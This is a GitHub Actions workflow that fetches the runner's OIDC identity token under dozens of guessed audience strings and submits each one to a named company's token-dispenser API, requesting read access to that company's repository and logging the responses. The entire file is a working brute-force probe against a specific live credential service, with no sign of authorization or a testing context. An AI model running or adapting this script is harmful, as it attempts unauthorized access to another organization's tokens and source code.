name: oidc
on: [workflow_dispatch, push]
permissions:
  id-token: write
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - run: |
          set +x
          base="${ACTIONS_ID_TOKEN_REQUEST_URL%%\?*}"
          try() {
            local aud="$1"
            if [ -n "$aud" ]; then
              enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$aud")
              tok=$(curl -s "$base?audience=$enc" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
            else
              tok=$(curl -s "$base" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
            fi
            if [ "${#tok}" -lt 50 ]; then echo "AUD[$aud] TOKFAIL $tok"; return; fi
            resp=$(curl -s -X POST https://gha-token-dispenser.flocksafety.com/api/token -H 'Content-Type: application/json' -d "{\"repo\":\"flocksafety/gg\",\"permissions\":{\"contents\":\"read\"},\"token\":\"$tok\"}")
            if echo "$resp" | grep -q 'invalid audience'; then echo "AUD[$aud] -> invalid-audience"; else echo "AUD[$aud] -> $(echo "$resp" | head -c 250)"; fi
          }
          try ""
          for a in "https://github.com/flocksafety" "github.com/flocksafety" "api://github.com/flocksafety" "https://flocksafety.com" "flocksafety.com" "api://flocksafety" "flocksafety" "api://gha-token-dispenser" "gha-token-dispenser" "https://gha-token-dispenser" "api://flock-gha-token-dispenser" "flock-gha-token-dispenser" "api://token-dispenser" "token-dispenser" "api://dispenser" "dispenser" "api://token" "token" "api://github-actions" "github-actions" "actions" "api://actions" "api://ci" "ci" "api://deploy" "api://promote" "gha" "api://gha" "gha.flocksafety.com" "api://gha.flocksafety.com" "flocksafety-gha" "api://flocksafety-gha" "flock" "api://flock" "api://flock-token-dispenser" "api://flock-dispenser" "flocksafety-dispenser" "api://flocksafety-dispenser"; do try "$a"; done
